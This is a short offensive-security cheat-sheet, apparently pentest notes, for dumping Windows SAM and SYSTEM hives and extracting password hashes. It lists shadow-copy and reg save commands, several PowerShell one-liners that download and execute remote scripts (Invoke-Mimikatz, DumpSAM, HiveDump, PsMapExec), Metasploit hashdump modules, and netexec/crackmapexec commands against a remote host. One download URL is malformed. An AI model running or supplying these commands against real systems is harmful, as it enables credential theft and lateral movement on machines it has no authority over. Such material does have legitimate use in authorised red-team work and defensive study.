# Sam

## VSS Copy
Create shadow copy of C:\
```powershell
wmic shadowcopy call create Volume='C:\'
```
Identify if VSS was successful
```powershell
vssadmin list shadows

# Example Output
Contents of shadow copy set ID: {8e3a3a18-93a6-4b18-bc54-7639a9baf7b2}
   Contained 1 shadow copies at creation time: 11/14/2019 6:53:26 AM
      Shadow Copy ID: {13fb63f9-f631-408a-b876-9032a9609c22}
         Original Volume: (C:)\\?\Volume{a74776de-f90e-4e66-bbeb-1e507d7fa0d4}\
         "Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1" <--- Copy this path
         Originating Machine: Client.corp1.com
         Service Machine: Client.corp1.com
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```
Copy the SAM and SYSTEM hives from the VSS path.
```powershell
# PowerShell
Copy-Item -LiteralPath '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam' -Destination .\SAM -Force
Copy-Item -LiteralPath '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system' -Destination .\SYSTEM -Force

# CMD
echo y | copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam .\SAM
echo y | copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system .\SYSTEM
```
## Reg Save
As a alternative method `reg save` can be used to copy the required SAM and SYSTEM hive files.
```powershell
reg save HKLM\sam .\SAM
reg save HKLM\system .\SYSTEM
```

# Extraction

### Windows
```powershell
# DumpSAM
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/refs/heads/main/DumpSAM.ps1")

# HiveDump
IEX(New-Object System.Net.WebClient).DownloadString("ttps://raw.githubusercontent.com/tmenochet/PowerDump/master/HiveDump.ps1") ; Invoke-HiveDump

#PsMapExec
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
PsMapExec -Targets All -Method WMI -Username Username -Password Password -Module SAM -ShowOutput

# Mimikatz
IEX (IWR -UseBasicParsing "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -command "lsadump::sam /system:SYSTEM /sam:SAM" # From local files
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' # From running system
```
### Metasploit
```bash
# Modules
use post/windows/gather/hashdump
use post/windows/gather/credentials/credential_collector

# Meterpreter Shell
hashdump

# Extension:Kiwi
lsa_dump_s
```
### Linux

```bash
netexec smb 10.10.10.100 -u username -p password --sam
crackmapexec smb 10.10.10.100 -u username -p password --sam
```


